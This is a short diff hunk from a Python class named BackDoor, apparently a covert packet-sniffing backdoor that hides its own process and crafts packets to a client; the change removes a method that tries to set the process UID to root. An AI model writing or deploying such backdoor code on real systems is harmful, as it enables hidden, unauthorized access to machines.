@@ -22,20 +22,11 @@ class BackDoor:
 
     def start(self):
         self.hide_process()
-        self.set_uid()
         print("Starting.....")
         print("Listening for packets")
         print("--------------------------------------------------------------")
         self.sniff_init()
 
-    def set_uid(self):
-        try:
-            os.setuid(0)
-            print("UID set")
-        except OSError as e:
-            print("UID not set")
-            print(f"Error: {e}")
-            sys.exit()
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
